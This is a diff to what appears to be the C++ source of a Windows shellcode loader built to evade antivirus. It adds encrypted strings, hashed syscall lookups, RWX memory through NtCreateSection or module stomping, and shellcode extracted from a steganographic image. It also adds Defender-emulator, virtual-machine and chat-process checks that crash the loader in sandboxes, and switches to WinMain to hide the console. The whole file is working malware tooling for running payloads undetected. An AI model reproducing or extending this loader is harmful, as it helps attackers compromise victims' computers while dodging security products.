@@ -18,8 +18,7 @@ static auto& dynamicInvoker = DynamicInvoker::get_instance();
 
 
 void test() {
-	initAllFunc();
-
+	custom_sleep(500); // sleep 0.5s
 }
 NTSTATUS AllocateMem(LPVOID* lpMem,PSIZE_T size) {
 	NTSTATUS status = 0xC0000001; 
@@ -35,7 +34,7 @@ NTSTATUS AllocateMem(LPVOID* lpMem,PSIZE_T size) {
 		HANDLE hSection = NULL;
 		SIZE_T secSize = *size;
 		LARGE_INTEGER sectionSize = { secSize };
-		pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(L"ntdll.dll")), NtCreateSection_Hashed);
+		pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtCreateSection_Hashed);
 
 		status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
@@ -43,13 +42,13 @@ NTSTATUS AllocateMem(LPVOID* lpMem,PSIZE_T size) {
 			SIZE_T viewSize = *size;
 			LPVOID mem = NULL;
 
-			pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(L"ntdll.dll")), NtMapViewOfSection_Hashed);
+			pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtMapViewOfSection_Hashed);
 			status = NtMapViewOfSection(hSection, (HANDLE)-1, lpMem, NULL, NULL, 0, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
 
 		}
 		break;
 	}case CASE_ModuleStomping: {
-		HMODULE hModule = myLoadLibrary(L"AppVIntegration.dll");
+		HMODULE hModule = myLoadLibrary(ENCRYPT_WSTR("AppVIntegration.dll"));
 
 		if (!hModule) return status;
 		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
@@ -58,7 +57,7 @@ NTSTATUS AllocateMem(LPVOID* lpMem,PSIZE_T size) {
 
 		// 查找.data段
 		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-			if (memcmp(section[i].Name, ".data", 5) == 0) {
+			if (memcmp(section[i].Name, ENCRYPT_STR(".data"), 5) == 0) {
 				DWORD oldProtect;
 				*lpMem = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
 				*size = section[i].Misc.VirtualSize;
@@ -162,13 +161,12 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 }
 
 // Hide Console
-// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+// int main() {
 
 	test();
-
-	// init function structure
 	initAllFunc();
+
 
 	if (AntiDefenderVM) {
 		wdCheckEmulatedVFS();
@@ -181,6 +179,9 @@ int main() {
 		if (wdIsEmulatorPresent3()) {
 			memcpy(0, 0, 1);
 		}
+	}
+	if (checkVXQQ) {
+		if (!checkProcessVX_QQ()) memcpy(0, 0, 1);
 	}
 	if (EnableAntiVM) {
 		if (trick_DllGetClassObject) {
@@ -197,15 +198,13 @@ int main() {
 
 		isVirtualMachine = checkCPUCoreNum() | checkPhysicalMemory() | checkBootTime() | checkGPUMemory() |
 			checkMacAddrPrefix() | accelerated_sleep();
-		DebugPrintA("isVirtualMachine[+]: %d\n", isVirtualMachine);
+		DebugPrintA(ENCRYPT_STR("isVirtualMachine[+]: %d\n"), isVirtualMachine);
 		if (isVirtualMachine) {
 			memcpy(0, 0, 1);
 		}
 		
 	}
-	if (checkVXQQ) {
-		if (checkProcessVX_QQ()) memcpy(0, 0, 1);
-	}
+	
 	// ============================= Allocate Memory ===============================
 	else { 
 		if (EnableSteg) {
@@ -222,22 +221,24 @@ int main() {
 			wcscat_s(imagePath, stegPath);
 
 			if (!ExtractShellcodeFromImage(imagePath, &stegShellcode, &stegSize)) {
-				DebugPrintA("Failed to extract shellcode from image\n");
+				// DebugPrintA("Failed to extract shellcode from image\n");
 				return -1;
 			}
 
 			// 使用提取的shellcode替换原始数据
 			memcpy(shellcode, stegShellcode, stegSize);
 			shellcode_size = stegSize;
-
-			// 清理
-			VirtualFree(stegShellcode, 0, MEM_RELEASE);
+			SIZE_T size = 0;
+			NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtFreeVirtualMemoryStruct.funcAddr, NtFreeVirtualMemoryStruct.funcHash,
+				(HANDLE)-1, &stegShellcode,&size,MEM_RELEASE);
+			
 		}
 		LPVOID lpMem = NULL;
 		SIZE_T size = shellcode_size;
 		NTSTATUS status = AllocateMem(&lpMem, &size);
 		// ======================= Processing Payload ==================================
-		// timing_SetTimer(5000); // sleep 5s
+		custom_sleep(500); // sleep 0.5s
+
 		memcpy(lpMem, shellcode, size);
 		DecryptShellcode(lpMem, size);
 		// ============================  EXECUTE ==================================
@@ -253,34 +254,4 @@ int main() {
 	
 
 	return 0;
-	/*
-	ExecuteShellcodeStruct execStruct = { 0 };
-	LPVOID lpMem = NULL;
-	SIZE_T size = sizeof(shellcode);
-
-	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
-	(HANDLE)-1,
-	&lpMem,
-	0,
-	&size,
-	MEM_RESERVE | MEM_COMMIT,
-	PAGE_READWRITE);
-	DWORD	dwOldProtection = NULL;
-
-	DebugPrintA("lpMem : %llx\n", lpMem);
-	MEMORY_BASIC_INFORMATION mbi = { 0 };
-	SIZE_T retSize = 0;
-	dynamicInvoker.Invoke<NTSTATUS>(NtQueryVirtualMemoryStruct.funcAddr, NtQueryVirtualMemoryStruct.funcHash,
-		(HANDLE)-1, lpMem, MemoryBasicInformation, &mbi, sizeof(MEMORY_BASIC_INFORMATION), &retSize);
-
-
-	// =============================  EXECUTE =========================
-	memcpy(lpMem, shellcode, sizeof(shellcode));
-	execStruct.lpMem = lpMem;
-	execStruct.memSize = sizeof(shellcode);
-	ExecuteShellcode(&execStruct);
-	// ============================ EXECUTE END =========================
-
-
-	*/
 }
